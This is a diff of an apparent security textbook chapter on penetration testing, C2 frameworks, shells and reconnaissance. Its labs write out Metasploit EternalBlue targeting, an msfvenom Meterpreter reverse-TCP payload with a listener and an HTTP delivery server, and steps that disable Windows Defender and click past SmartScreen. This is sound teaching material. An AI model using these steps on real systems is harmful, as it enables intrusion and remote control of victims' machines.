@@ -1,13 +1,16 @@
-# Chapter 10 - Security Testing
-![](../images/10/security_tools.jpg)
-
-Regular testing for vulnerabilities provides assurances to stakeholders that systems, networks, and applications are potentially free from security issues.  An entire subindustry has developed over the years where organizations hire security professionals to test the security of their systems and data.  This chapter will examine security testing processes and tools, why it is important to the management of organizations, and how security professionals perform such tests.  You will be introduced to the penetration testing topic, command and control frameworks, and how threat actors achieve remote shells onto systems.
+<span class="chapter-banner">Chapter 10</span>
+# Security Testing
+<div class="image-crop">
+  <img src="../images/10/security_tools.jpg">
+</div>
 
 **Objective**
 1. Describe the types and scopes of security testing processes.
 2. Perform shell and reverse shell connections.
 3. Understand the components of the security testing process.
 4. Conduct a penetration test against Metasploitable2.
+
+Regular testing for vulnerabilities provides assurances to stakeholders that systems, networks, and applications are potentially free from security issues.  An entire subindustry has developed over the years where organizations hire security professionals to test the security of their systems and data.  This chapter will examine security testing processes and tools, why it is important to the management of organizations, and how security professionals perform such tests.  You will be introduced to the penetration testing topic, command and control frameworks, and how threat actors achieve remote shells onto systems.
 ## Security Testing Fundamentals
 Organizations will engage with security professionals to evaluate the extent of security misconfigurations and vulnerabilities that are present in their systems.  Such efforts are usually demanded by stakeholders like management, customers, auditors, or regulators to provide assurance that the systems and networks are secure. Therefore, it is common to have a regularly occurring security testing process performed against the organization's systems.  The results of such tests are usually formalized within a report that demonstrates the scope and results that were achieved.
 ### Security Testing Types
@@ -19,10 +22,10 @@ Another type of security testing is **penetration testing**, or *pentest*, which
 
 Over the last several years **bug bounty programs** have become very popular.  These programs were developed because independent security researchers were conducting unsolicited security testing of networks and applications.  Performing such tests puts the organization and the security researcher in jeopardy as the systems being tested could be negatively impacted and the researcher held legally or criminally liable.  However, many organizations began to recognize the talent in the security community and wanted to focus it in a productive manner.  Bug bounty programs involve an incentive, usually financial, for the discovery and responsible disclosure of unique security issues.  
 
+Organizations had to develop legal and engagement processes, marketing to security researchers, scoping criteria, and many other details that created friction in implementing such a program.  In response to this problem, a handful of bug bounty platforms sprung up that streamlined the setup process and registering of security researchers.  This structuring of the market enabled organizations to quickly implement bounty programs giving security researchers new permitted targets to test.  Also, by formalizing security researchers' efforts, they gained protection from legal prosecution while satiating their desire to perform real-world engagements.  
+
 >[!warning] Warning - Legal Trouble
 >There is legal recourse companies can take against individuals that violate terms of service or laws.  More common a couple decades ago, but not entirely extinct today, are organizations that do not welcome unsolicited security testing.  Many such organizations may even take legal action against researchers.  A few years ago, a journalist found that a state government website had exposed social security numbers within its client-side source code. [^1]  When responsibly disclosing this data leak, the state responded with threats of legal action against the journalist for "hacking".  Public outcry may have ultimately killed the state's legal response, but the attitude against responsible disclosure is still prevalent.
-
-Organizations had to develop legal and engagement processes, marketing to security researchers, scoping criteria, and many other details that created friction in implementing such a program.  In response to this problem, a handful of bug bounty platforms sprung up that streamlined the setup process and registering of security researchers.  This structuring of the market enabled organizations to quickly implement bounty programs giving security researchers new permitted targets to test.  Also, by formalizing security researchers' efforts, they gained protection from legal prosecution while satiating their desire to perform real-world engagements.  
 
 There are several issues associated with these bug bounty programs.  Popular targets often have the same issues discovered but only one bounty will be paid, leaving a large administrative burden on the organization to assess and compare all reported vulnerabilities.  Another criticism is the potential for abuse due to the financial incentive of vulnerabilities.  Imagine a developer purposefully introducing a vulnerability to have a friend report it and split the proceeds.
 
@@ -39,10 +42,10 @@ Using a third-party testing firm absolves stakeholder concerns for conflicts of 
 
 Another criticism of using third-party testing firms is that they are engaged for a brief period of time, usually around two weeks.  Much of this time is spent setting up and learning about the environment they are testing.  They also have to juggle multiple clients during the engagement period due to other client retesting requirements as well as follow up questions posttest.  There are other demands for their time and attention outside testing windows as they have to conceivably perform other duties for their firms, such as staff meetings and training.  Given these pros and cons of in-house versus outsourced testers, it is ideally, a mixture of the two is performed getting the best of both and compensating for each other's misgivings.
 
-The scope of an engagement must define what is to be tested, such as the type of assets that will be tested.  Some of the most common engagements will be centered around a number of networks, web or mobile applications, or physical locations.  In a network penetration test, the tester will be provided one or more IP addresses to assess.  You could imagine these tests start with a port and service scan on each IP followed up by a version discovery and a vulnerability scan.  In a web application test, the engagement would define what domains or URLs are within the scope.  In a mobile application engagement, a test copy of the application might be provided to the tester.  Physical security tests should clearly document address locations and what areas are targeted.  In addition to detailing the targets, *objectives* must also be defined.  These objectives would detail the goals for the tester to achieve, such as obtaining domain administrator privileges, accessing a privileged page, discovering remote code execution, or accessing a server room.
-
 >[!info] Info - Cloud Security Testing
 >A subset of network tests that have become increasingly popular over the years is testing cloud environments.  These *cloud pentests* are similar to traditional network tests in concept but are tailored to cloud technologies that require an almost entirely different skillset and experience.  I highly recommend Rhino Security Labs (https://rhinosecuritylabs.com/) which has contributed to the community greatly with open-source tools and literature on cloud security testing.
+
+The scope of an engagement must define what is to be tested, such as the type of assets that will be tested.  Some of the most common engagements will be centered around a number of networks, web or mobile applications, or physical locations.  In a network penetration test, the tester will be provided one or more IP addresses to assess.  You could imagine these tests start with a port and service scan on each IP followed up by a version discovery and a vulnerability scan.  In a web application test, the engagement would define what domains or URLs are within the scope.  In a mobile application engagement, a test copy of the application might be provided to the tester.  Physical security tests should clearly document address locations and what areas are targeted.  In addition to detailing the targets, *objectives* must also be defined.  These objectives would detail the goals for the tester to achieve, such as obtaining domain administrator privileges, accessing a privileged page, discovering remote code execution, or accessing a server room.
 
 Test engagements should also define the approach to the environment that is to be tested.  The approach would detail if the tests are conducted from within or outside the environment - or internal vs external to the environment.  The following diagram illustrates this concept from a network engagement, but the idea could also apply to an application or physical test.
 
@@ -50,10 +53,10 @@ Test engagements should also define the approach to the environment that is to b
 
 External testing, as demonstrated by the attacker outside the red dotted network boundary, provides the tester with only a public network to attack.  It is similar to the internet's perspective of the organization's network.  External tests are typically less resource intensive and costly, as the number of reachable assets is limited.  However, they also only provide an outside point of view and will exclude many vulnerabilities and misconfigurations that exist within a network.  Internal testing, represented by the attacker in the hat within the red dotted lines, provides the tester with direct access to the network.  This could include a *drop box*, such as a Raspberry Pi or laptop controlled by the tester, placed within and connected to the network, enabling them to reach internal resources behind the router or network firewall.
 
-In addition to internal or external considerations, authentication must be determined prior to starting tests.  Unauthenticated tests, called *black box tests*, do not provide the tester with credentials to the networks, systems, or locations being tested.  This greatly limits the tester's ability to discover issues, but it does offer insights as to what an anonymous attacker could discover.  *Grey box* tests provide testers with credentials to the scoped assets giving them an insider perspective.  These tests might include low privileged, privileged, or both sets of credentials depending on the objectives of the tester.  An even more thoroughly scoped test is a *white box test* in which any internal documentation, including but not limited to source code and network topologies, is provided to the tester.  The tester uses this information to more efficiently identify areas of weakness in the assets they are testing.  Many third-party firms charge a premium for these tests as they are more laborious to execute.
-
 > [!tip] Tip - Provide Firewall Bypass
 > It is recommended to allow list tester IP addresses in security systems like WAFs and IPSs during the testing window.  This removes obstacles that might otherwise hide the root cause of security issues or waste limited and costly time.
+
+In addition to internal or external considerations, authentication must be determined prior to starting tests.  Unauthenticated tests, called *black box tests*, do not provide the tester with credentials to the networks, systems, or locations being tested.  This greatly limits the tester's ability to discover issues, but it does offer insights as to what an anonymous attacker could discover.  *Grey box* tests provide testers with credentials to the scoped assets giving them an insider perspective.  These tests might include low privileged, privileged, or both sets of credentials depending on the objectives of the tester.  An even more thoroughly scoped test is a *white box test* in which any internal documentation, including but not limited to source code and network topologies, is provided to the tester.  The tester uses this information to more efficiently identify areas of weakness in the assets they are testing.  Many third-party firms charge a premium for these tests as they are more laborious to execute.
 ## Frameworks
 A **framework** in the context of security testing is a toolset designed to manage the assessment of targets.  It provides the tester with a suite of tools that can identify and exploit targets but also to manage the sessions from compromised endpoints.  Typically, these tools can handle a high volume of compromised devices.  Once an endpoint is compromised, additional tools within the framework are available to extend post exploitation techniques including moving laterally within compromised networks.  Along the way, the framework logs activity and results to support findings and to generate reports.
 
@@ -73,28 +76,28 @@ There are many frameworks a tester can use that range from free to use to commer
 > ```bash
 > sudo msfdb run
 > ```
-> ![[../images/10/basics_activity_msf_start.png|Starting Metasploit Framework on Kali|600]]
-> The first time launching Metasploit creates a database which is used to store testing information.  Framework users can create new databases for each engagement they are on to keep interests separate from each other.  After waiting a minute for the database to initialize, we are presented with some ASCII art that changes each time the tool is started, and the `msf6` command line, known as the console.
-> ![[../images/10/basics_activity_msf6.png|Metasploit Fully Loaded|600]]
-> Metasploit is a command line tool that uses its own command prompt with built-in commands.  The best command to learn first is the `help` command as it will display a description of all other commands.
+> ![[../images/10/basics_activity_msf_start.png|Starting Metasploit Framework on Kali|500]]
+> The first time launching Metasploit creates a database which is used to store testing information.  Framework users can create new databases for each engagement they are on to keep interests separate from each other.  
+> ![[../images/10/basics_activity_msf6.png|Metasploit Fully Loaded|500]]
+> After waiting a minute for the database to initialize, we are presented with some ASCII art that changes each time the tool is started, and the `msf6` command line, known as the console.  Metasploit is a command line tool that uses its own command prompt with built-in commands.  The best command to learn first is the `help` command as it will display a description of all other commands.
 > ```
 > help
 > ```
-> ![[../images/10/basics_activity_help.png|Metasploit Help Menu|600]]
+> ![[../images/10/basics_activity_help.png|Metasploit Help Menu|500]]
 > The help menu organizes commands in sections that include Core Commands, Module commands, Job Commands, as well as a few others.  Core Commands help with administering the console and includes commands such as `set` that assigns a given value to a variable, `quit` which exits the console, and `sessions` that list all the available sessions created.  The following list from the help menu describes all available commands.
-> ![[../images/10/basics_activity_core.png|Metasploit Core Commands|600]]
+> ![[../images/10/basics_activity_core.png|Metasploit Core Commands|500]]
 > The next section of the help menu is the Module Commands section.  These commands are used to find, select and navigate modules within the framework.  The `info` command describes information about a module, whereas the `search` command can help find a module by keywords.  Other useful module commands are `use` which selects a module, `options` that display the configuration for the module, and `back` to exit out of the module.
-> ![[../images/10/basics_activity_module.png|Metasploit Module Commands|600]]
+> ![[../images/10/basics_activity_module.png|Metasploit Module Commands|500]]
 > I will demonstrate the navigation of Metasploit by searching for modules related to SMB, which is a popular Windows protocol for sharing remote services like printers and files.  Using the search command with keyword SMB, a list of all the modules in Metasploit are displayed.
 > ```
 > search smb
 > ```
-> ![[../images/10/basics_activity_search.png|Searching SMB In Metasploit]]
+> ![[../images/10/basics_activity_search.png|Searching SMB In Metasploit|700]]
 > The search reveals over one hundred modules with the keyword SMB in its name or description.  It produced a list of modules from auxiliary, post-exploitation, and exploit categories.  I will refine my search to identify modules related to the Eternal Blue vulnerability and exploits.  Eternal Blue was made famous through its use in WannaCry ransomware, as well as the story behind its discovery being leaked by a threat actor that hacked the NSA and leaked it online.  The exploit leverages particular weaknesses in SMB to achieve remote code execution as the System user.
 > ```
 > search eternal
 > ```
-> ![[../images/10/basics_activity_eternal_search.png|Searching Eternal Blue Exploits In Metasploit|600]]
+> ![[../images/10/basics_activity_eternal_search.png|Searching Eternal Blue Exploits In Metasploit|500]]
 > This list of modules includes the Eternal Blue exploit that I am searching for.  To select it, I issue the `use` command while specifying the relative index number in the first column or the full path name of the module.
 > ```
 > use 0
@@ -107,13 +110,13 @@ There are many frameworks a tester can use that range from free to use to commer
 > ```
 > ![[../images/10/basics_activity_options.png|Eternal Blue Options|600]]
 > You may have noticed between running the use and options commands that Metasploit logged a "No payload configured" message to the console and that a payload was automatically assigned.  This module requires the use of a payload module which also has settings that are displayed after running options.  The payload options LHOST and LPORT are used to instruct Metasploit where to establish a reverse connection, known as a *listener*.  We have used listeners such as Netcat in other chapters of this textbook, but Metasploit also has the capability of setting them up.  We will explore listeners and payloads later in this chapter, but their configuration is worth noting here.
-> ![[../images/10/basics_activity_payload_options.png|Payload Options For Eternal Blue|600]]
+> ![[../images/10/basics_activity_payload_options.png|Payload Options For Eternal Blue|500]]
 > The Eternal Blue module needs to be instructed which asset to target.  The "R" in "RHOSTS" and "RPORT" stands for remote and is used to specify the target to attack.  I will need to set RHOSTS because it is currently blank and is required. 
 > ```
 > set RHOSTS 192.168.1.5
 > options
 > ```
-> ![[../images/10/basics_activity_set_rhosts.png|Setting RHOSTS For Eternal Blue|600]]
+> ![[../images/10/basics_activity_set_rhosts.png|Setting RHOSTS For Eternal Blue|500]]
 > Running the options command again I can see that RHOSTS is no longer blank!  Once all required settings are configured, and a listener is setup (which it currently is not), the exploit module can be launched using the `run` or the `exploit` commands.
 
 While Metasploit generally focuses on the compromise of targets, other frameworks are built to optimize **command and control (C2)** through the use of agents.  A free and opensource C2 framework is Covenant, whereas a common and often abused commercial grade framework is Cobalt Strike.  This type of framework is explored in more detail within the following section.
@@ -134,7 +137,7 @@ The reverse proxy C2 server can validate victim traffic in a number of ways.  On
 
 Victims communicate with frameworks using an *agent* that has been installed on the compromised device.  This malicious software is often classified as a *trojan* while having the unique characteristic of a resilient connection to the C2 servers.  Instead of establishing and maintaining a persistent TCP/IP connection to the C2 server, the agent periodically reaches out to the C2 server to inspect if there are any instructions to follow.  The frequency and jitter of these connections can be randomized to avoid clear patterns that may be more easily detected by defenders.  But they all generally work the same where the agent installed on the victim device makes an outbound connection to an internet facing C2 server in order to check if there is a pending command configured by the attacker.  If there is no command, the agent sleeps for some period of time before attempting again.
 
-![[../images/10/c2_agents.png|C2 Agent Communication Flow|550]]
+![[../images/10/c2_agents.png|C2 Agent Communication Flow|500]]
 
 When the attacker is ready to have a victim or group of victims perform some task, such as a *distributed denial of service (DDoS)* attack, they log into the framework C2 and insert a command.  When the agents eventually check in, they see the command and execute it.  After the victim executes the command, the results are returned to the C2 and then the querying starts over.  In the next section we will explore shells and *reverse shells* that work similarly to agents.
 ## Shells
@@ -152,7 +155,7 @@ The security of remote shells is very important since it makes the remote device
 
 A common remote shell protocol and application is Telnet, however it should be avoided.  Even though Telnet on port 23 has authentication features built-in, it does not support encryption, leaving it susceptible to MitM attacks.  Alternatively, the *Secured Shell (SSH)* protocol over port 22 offers enhanced authentication methods, such as the use of key-based authentication instead of passwords, while also supporting AES encryption.  Microsoft Windows also supports secured remote shells over their proprietary Windows Remote Manager (WinRM) on ports 5985 and 5986.  The following diagram depicts the most basic of SSH connections where a client establishes a remote session with a device that has a listening SSH service.
 
-![[../images/10/shell_ssh.png|Basic SSH Connection|275]]
+![[../images/10/shell_ssh.png|Basic SSH Connection|250]]
 
 >[!activity] Activity 10.2 - SSH Connection
 >To demonstrate SSH, I will set up the Ubuntu VM as an SSH server and then connect to it using the Kali VM; both VMs are required to be on the same network using Bridge Adapter network modes.
@@ -161,33 +164,33 @@ A common remote shell protocol and application is Telnet, however it should be a
 >```bash
 >ss -ant
 >```
->![[../images/10/ssh_activity_ss.png|Socket Statistics On Ubuntu|600]]
+>![[../images/10/ssh_activity_ss.png|Socket Statistics On Ubuntu|500]]
 >From the ss command I see that TCP ports 631, 53, 80, and 443 are listening.  Ports 80 and 443 are related to the Web Application Defense chapter's activity where we set up and secured the Apache web server.  The other ports came preconfigured when I installed Ubuntu.  But what I do not see is the secure shell (SSH) remote management port 22 open, so I install OpenSSH using the following command.
 >```bash
 >sudo apt install openssh-server -y
 >```
->![[../images/10/ssh_activity_openssh.png|Installing OpenSSH on Ubuntu|600]]
+>![[../images/10/ssh_activity_openssh.png|Installing OpenSSH on Ubuntu|500]]
 >Once OpenSSH is installed, I start the SSH service and check its status that shows the daemon is active and running without error.
 >```bash
 >sudo systemctl start ssh
 >systemctl status ssh
 >```
->![[../images/10/ssh_activity_start_ssh.png|Starting SSH Service on Ubuntu|600]]
+>![[../images/10/ssh_activity_start_ssh.png|Starting SSH Service on Ubuntu|500]]
 >Checking Socket Statistics again now shows that port 22 is open to network connections!
 >```bash
 >ss -ant
 >```
->![[../images/10/ssh_activity_ss_confirmed.png|Socket Statistics Port 22 Listening|600]]
+>![[../images/10/ssh_activity_ss_confirmed.png|Socket Statistics Port 22 Listening|500]]
 >Before I attempt to connect to the Ubuntu VM over SSH from Kali, I will need to know the Ubuntu IP address using the `ip` command.  In my case, the IP address is found to be 192.168.4.169.
 >```bash
 >ip a
 >```
->![[../images/10/ssh_activity_ip.png|Ubuntu VM's IP Address|600]]
+>![[../images/10/ssh_activity_ip.png|Ubuntu VM's IP Address|550]]
 >After starting the Kali VM, logging in, and opening a terminal, I run the preinstalled SSH client software to connect to the Ubuntu VM.  This command requires the use of `sudo`, as it establishes a new network connection.  The command syntax for SSH is "username" at "IP address" as demonstrated in the following command.
 >```bash
 >sudo ssh daniel@192.168.4.169
 >```
->![[../images/10/ssh_activity_connect.png|SSH Connection to Ubuntu From Kali|600]]
+>![[../images/10/ssh_activity_connect.png|SSH Connection to Ubuntu From Kali|550]]
 >After entering the command, the Kali VM prompts me for the Kali `daniel` user password, since I am using `sudo`.  Then, SSH instructs me that the Ubuntu host I am seeking to connect to does not have a local asymmetric key associated with it and asks me if I trust the host and public key provided by Ubuntu.  I enter `yes` which adds the key to my local `known_hosts` file to be trusted in the future.  The next SSH session I make with Ubuntu will not prompt me again unless the keys are rotated.
 >
 >Once I enter yes, I am prompted to provide the password for the `daniel` user on the Ubuntu VM.  I then enter the password for the user, and I am greeted with the Ubuntu terminal's "message of the day" and provided a command line interface!  My shell is transformed to `daniel@154-ubuntu` indicating that my terminal to the Ubuntu shell is ready for commands.
@@ -215,10 +218,8 @@ There are several native technologies that an attacker can leverage on a victim 
 > Metasploit comes with a utility called Msfvenom that is used to generate payloads, or executables, that will establish a connection to a Metasploit listener running on an attacker's machine.  You could think of the Msfvenom payloads as reverse shell executables that could be sent to a victim user in a phishing email, or by some other method.  
 > 
 > In this activity, I will demonstrate how to generate an Msfvenom payload, set up a Metasploit listener, and simulate a victim's execution of the malware using the Windows and Kali VMs.  It is important that both machines are on the same network as they will need to reach each other in order for the reverse shell to be made.
-> 
->  Windows Defender will quickly identify the Msfvenom payload as malware so I will disable the antivirus for the sake of the demonstration.  Note that there are several methods to bypass antivirus that exceed the scope of this demonstration, but that we covered in an earlier chapter.  After starting the Windows VM, I navigate to the "Virus & threat protection" system settings using the search menu.
->  ![[../images/10/rev_activity_av.png|Launching Windows Defender Settings|500]]
->  Then I press "Manage settings" under the Virus & threat protection settings section to launch the setting options window.
+>  ![[../images/10/rev_activity_av.png|Launching Windows Defender Settings|400]]
+>  Windows Defender will quickly identify the Msfvenom payload as malware so I will disable the antivirus for the sake of the demonstration.  Note that there are several methods to bypass antivirus that exceed the scope of this demonstration, but that we covered in an earlier chapter.  After starting the Windows VM, I navigate to the "Virus & threat protection" system settings using the search menu.  Then I press "Manage settings" under the Virus & threat protection settings section to launch the setting options window.
 >  ![[../images/10/rev_activity_settings.png|Defender Manage Settings|450]]
 >  With the Settings window launched, I flip the "Real-time protection" setting to disable.  This will turn Defender off and prevent the blocking of the Msfvenom payload used later.  However, the next time the Windows machine reboots, Real-time protection will be automatically flipped back on.
 >  ![[../images/10/rev_activity_disabled.png|Disabled Windows Defender|450]]
@@ -239,7 +240,7 @@ There are several native technologies that an attacker can leverage on a victim 
 >  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.4.167 LPORT=9001 -f exe -o runme.exe
 >  ```
 >  ![[../images/10/rev_activity_msfvenom.png|Payload Generated On Kali|600]]
->  I will need the victim to download this executable so I set up a Python HTTP webserver using the following command.
+>  I will need the victim to download this executable, so I set up a Python HTTP webserver using the following command.
 >  ```bash
 >  python3 -m http.server 80
 >  ```
@@ -271,15 +272,15 @@ There are several native technologies that an attacker can leverage on a victim 
 >  ```
 >  ![[../images/10/rev_activity_run_listener.png|Run Configured Multi-Handler|600]]
 >  With the Msfvenom payload executable generated, HTTP server ready to serve it, and the Metasploit multi handler listener running, I am ready to spring the attack on the victim.  Jumping back to the Windows VM and pretending to be the victim, I open a browser and navigate to `192.168.4.167` to see the files being served by the attacker.  I press the `runme.exe` file to start the download.
->  ![[../images/10/rev_activity_files.png|Victim Payload Download|600]]
+>  ![[../images/10/rev_activity_files_3.png|Victim Payload Download|500]]
 >  Microsoft Edge immediately detects that the file is an executable and blocks the download.  To overcome this, I tell Edge to keep the file regardless.
->  ![[../images/10/rev_activity_edge_bypass.png|Bypassing Edge Warning]]
+>  ![[../images/10/rev_activity_edge_bypass.png|Bypassing Edge Warning|400]]
 >  As soon as I press the Keep option, Microsoft SmartScreen identifies that the downloaded executable has not been signed with a reputable certificate.  I tell SmartScreen to "Keep anyway" under the "Show more" dropdown to complete the download.
->  ![[../images/10/rev_activity_smartscreen_1.png|Edge SmartScreen Warning|300]]
+>  ![[../images/10/rev_activity_smartscreen_1.png|Edge SmartScreen Warning|350]]
 >  Finally, the runme.exe file is in my downloads folder.
->  ![[../images/10/rev_activity_downloaded.png|Runme.exe In Downloads Folder|300]]
+>  ![[../images/10/rev_activity_downloaded.png|Runme.exe In Downloads Folder|350]]
 >  Double clicking the file immediately triggers another SmartScreen warning, this time because the executable has the "mark of the web" in its properties.  Clearly, Microsoft has learned about this attack vector and has put many obstacles in place to prevent a user from running malicious software from the internet!
->  ![[../images/10/rev_activity_smartscreen_2.png|SmartScreen Block At Running|400]]
+>  ![[../images/10/rev_activity_smartscreen_2.png|SmartScreen Block At Running|300]]
 >  I press the "More info" link which enables the "Run Anyway" button at the bottom of the Window.  Pressing this button will trigger the reverse shell connection.  You might be wondering how practical such an attack would be given all the security warnings implemented by Microsoft.  Each of these have multiple bypasses that could be deployed while some could be avoided altogether.  Such bypasses exceed the scope of this activity and interested readers are encouraged to research on their own.
 >  
 >  After hitting Run Anyway, nothing appears to have happened on the Windows VM.  However, jumping back to Kali's Metasploit listener, I see that a connection was made.  The attacker now has remote control of this Windows victim through a Meterpreter reverse shell!
@@ -297,15 +298,15 @@ One method to block outbound reverse shell connections within a network is to co
 ## Testing Process
 Attackers, penetration testers, and red teams follow a typical testing flow that can be organized in phases.  These phases, which are described further in this section, have a logical path of flow or execution order, but should be interpreted as a general guideline and are not strictly required.  After the engagement scope is documented, a test may start with **reconnaissance** work in which the tester identifies and learns about the target.  From there, the tester will perform **enumeration** on the targets to identify the specific points of entry available.  Upon discovery of an entry point, the tester will conduct an **exploitation** phase which is used to gain **initial access** to the target.  Once the target has been accessed, **post exploitation** efforts covered in the Persistence and Privilege Escalation chapter are performed.  The tester will document their activities and notable findings as they proceed, which will be consolidated and refined in a final document during the final **reporting** phase.
 ### Reconnaissance
-A goal of reconnaissance (recon) is to discover information about the target prior to performing any attacks.  Any information could be valuable so there is no limit to what should be collected.  Usually, this information will surround the people and technologies used by the target.  Building a roster of the organization's employees, such as their title and names, provides the tester or attacker with information that can be used later to wage attacks.  Consider the value of such information when sending phishing emails, as they would be more potent if the email was crafted to masquerade as a direct supervisor of the targeted user.  Furthermore, constructing a technology profile used by the organization enables the tester to focus attacks that will save time and be more discrete during attacks.  The tester would not want to test for Oracle SQL vulnerabilities if the target is using MySQL.
+A goal of reconnaissance (recon) is to discover information about the target prior to performing any attacks.  Any information could be valuable so there is no limit to what should be collected.  Usually, this information will surround the people and technologies used by the target.  Building a roster of the organization's employees, such as their title and names, provides the tester or attacker with information that can be used later to wage attacks.  Consider the value of such information when sending phishing emails, as they would be more potent if the email was crafted to masquerade as a direct supervisor of the targeted user.  Furthermore, constructing a technology profile used by the organization enables the tester to focus attacks that will save time and be more discrete during attacks. 
 #### Passive Reconnaissance
 The reconnaissance phase can be further divided into *passive* and *active* categories.  Passive reconnaissance are efforts by the tester that will use publicly available resources to identify a target anonymously.  Such efforts are accomplished by using third party resources that have already gathered information on a target which the tester can use without the target knowing.  For example, in the Website Discover section in the Web Application Attacks chapter, we leveraged Google to identify subdomains of a target domain.  This effort would be anonymous relative to the target since Google would not normally report the search activity to the target.  Another example of passive enumeration was demonstrated in the Network Services chapter's Zone File activity where we used dnsdumpster.com to passively identify DNS records.
 
 There are many public sites that collect information on the target that can be used for passive recon.  Many employees of organizations will list their work experience in detail on their LinkedIn profiles.  Organizations often have their own LinkedIn profiles for marketing purposes.  LinkedIn correlates individual's current work experience to these organization LinkedIn profiles which effectively provides an opensource employee directory roster.  Still building on the power of LinkedIn for passive recon is that the platform is heavily used by organizations for job postings, which sometimes leaks the technologies used.  For example, a job posting may state that the organization is looking for a MySQL database administrator.  This is a strong indication to the tester that the backend used for the company's website would be MySQL.
 
-Another fantastic passive recon resource is Shodan, who regularly scans the entire internet public IP range for services.  Imagine performing an NMAP port, service, and version scan on every IP address, then making all the data accessible via a search engine.  That is what Shodan's service offers.  In addition, Shodan users can enter keywords like a company name and Shodan will return all related IP addresses and services.  The following screenshot is taken from Shodan after searching the term yahoo.  It reveals thousands of IP addresses across the globe.  Each IP can be drilled down further to discover even more information on the target.
+![[../images/10/shodan.png|Shodan Search For Yahoo|600]]
 
-![[../images/10/shodan.png|Shodan Search For Yahoo]]
+Another fantastic passive recon resource is Shodan, who regularly scans the entire internet public IP range for services.  Imagine performing an NMAP port, service, and version scan on every IP address, then making all the data accessible via a search engine.  That is what Shodan's service offers.  In addition, Shodan users can enter keywords like a company name and Shodan will return all related IP addresses and services.  The following screenshot is taken from Shodan after searching the term yahoo.  It reveals thousands of IP addresses across the globe.  Each IP can be drilled down further to discover even more information on the target.
 #### Active Reconnaissance
 Active reconnaissance activity still seeks to acquire useful information on the target; however, it does so in a less conspicuous manner that the target might notice or later trace back the tester's activity.  An example of active reconnaissance is when the tester accesses a target's website.  Such efforts would cause events to be registered in the web server's logs which would contain the tester's IP address.  Regardless, a target's website may contain a lot of useful information to the tester, such as the organization's management or email addresses.  Finding a user's email address could reveal the syntax used to for usernames in the target's network domain.  Common username syntax includes combinations of initials, full names and punctuation.  Observing an actual email address may reveal the username syntax used by the organization's information systems.
 
@@ -321,7 +322,7 @@ The scan identifies that port 21 is open on the target 172.17.0.2.  Port 21 is r
 
 With service software and versions in hand, the tester can perform a vulnerability scan identifying any known vulnerabilities based on the versions of the identified software.  NMAP has a built-in vulnerability scanner, but it is not usually depended upon as it is limited in the volume of vulnerabilities it can detect.  The Security Systems chapter covered vulnerability scanning that the tester could also use during this phase.  However, there are other resources available to the tester without having to resort to full scan.  For example, after discovering the service and version, the tester can look up any known vulnerabilities and available exploits on exploit-db.com.  Continuing the scenario based on the NMAP scan above, where the Vsftpd service running version 2.3.4 was discovered, navigating to exploit-db.com and searching the service and version reveals published Backdoor Command Execution exploit.
 
-![[../images/10/exploitdb_vsftpd.png|ExploitDB Search For Vsftpd 2.3.4]]
+![[../images/10/exploitdb_vsftpd.png|ExploitDB Search For Vsftpd 2.3.4|700]]
 
 The attacker can then use this exploit in the next phase of the testing lifecycle.
 ### Exploitation/Initial Access
@@ -337,11 +338,11 @@ Everyone should realize by now that many commonly used web applications have bee
 
 Instead of downloading these databases from the seedy underworld, someone could simply navigate and search on a free online service such as breachdirectory.org.  Entering an old and now defunct email address of mine in this search engine shows the partial cleartext as well as the full hashed password stolen from one of these breaches!
 
-![[../images/10/breach_directory.png|Breach Directory Search|500]]
+![[../images/10/breach_directory.png|Breach Directory Search|350]]
 
 The partial password and hash could be used to easily perform an offline dictionary attack and crack the password.  However, it might be a common enough password to already be in a rainbow table or otherwise precomputed.  There also exist online search engines where you enter a hash and the plaintext is returned from a pre-cracked database.  One of my favorites is crackstation.net where I enter the hash provided from Breach Directory and have the cracked password returned!
 
-![[../images/10/crackstation.png|Crack Station Result]]
+![[../images/10/crackstation.png|Crack Station Result|650]]
 
 Do not worry, this password and email address of mine are no longer in use.  I learned long ago that using a dictionary word for a password was a bad idea and I have replaced all my passwords with long and high entropy values while ensuring I use a unique password for every system.  But most people have not learned this lesson and will use the same password or slightly modified password for every system, including systems they use for work.  Astute testers know this and will research people's personal emails, find leaked passwords, and use them to guess credentials for other systems known as a **password stuffing** attack.
 
@@ -350,11 +351,13 @@ Do not worry, this password and email address of mine are no longer in use.  I l
 >
 >One year, I decided to cover the password stuffing attacks from a practical perspective.  While I structured the training using a slide deck, I also demonstrated password stuffing live.  I chose the company's previous CEO as a target and navigated to their LinkedIn profile.  This individual revealed their personal email address within their profile's contact information, which is commonly done on that platform.  I took this email and headed over to Breach Directory which displayed several records with partial passwords to a variety of systems that were leaked.  With a hash in hand, I headed over to Crack Station and pulled the cracked password in plaintext.  From there, I rhetorically asked the board members if any of them use the same or similar password for multiple systems and if they also used them for work.  
 >
->Later that afternoon, several hours after the training and the board meeting completed, half of the board members called me directly very concerned about their own password security.  I instructed each of them on the value of password hygiene and how to best protect themselves.  I would say the training was a success!
+>Later that afternoon, several hours after the training and the board meeting completed, half of the board members called me directly and very concerned about their own password security.  I instructed each of them on the value of password hygiene and how to best protect themselves.  I would say the training was a success!
 #### Password Spraying Attacks
 Many password systems mitigate online password brute force attacks by putting a limit on the number of sequential incorrect password attempts before the account is locked.  This introduces a denial of service as an attacker could purposefully and continuously lock an account.  Therefore, a more sophisticated mitigation is to put a time delay between guesses that makes brute force efforts take too long for the attacker's patience.  In light of these mitigations, a **password spraying** technique was developed that attempts to log into several accounts using a common password.  This technique avoids causing accounts to be locked and is often successful if there are enough users to guess.  For example, somebody is probably using `Password123!` and by checking one user account at a time, the attacker is likely to find them.
 #### Service Exploitation
-Most services are reasonably secure and only allow for the functionality of the service without enabling remote access to the underlying system.  However, it is not uncommon for a service to have a vulnerability discovered that allows arbitrary code or command execution that leads to a complete system compromise.  This happens so often that regular patch management is a must for network exposed services.  Take the example of the Vsftpd service running version 2.3.4 in the scenario provided in the previous section where a remote code execution exploit was listed on ExploitDB.  This service is absolutely discoverable by a tester and would be exploited to gain initial access.  To avoid this type of exploitation, it is important for defenders and administrators to ensure a strong patch management process while limiting the attack surface of exposed systems.
+Most services are reasonably secure and only allow for the functionality of the service without enabling remote access to the underlying system.  However, it is not uncommon for a service to have a vulnerability discovered that allows arbitrary code or command execution that leads to a complete system compromise.  This happens so often that regular patch management is a must for network exposed services.  
+
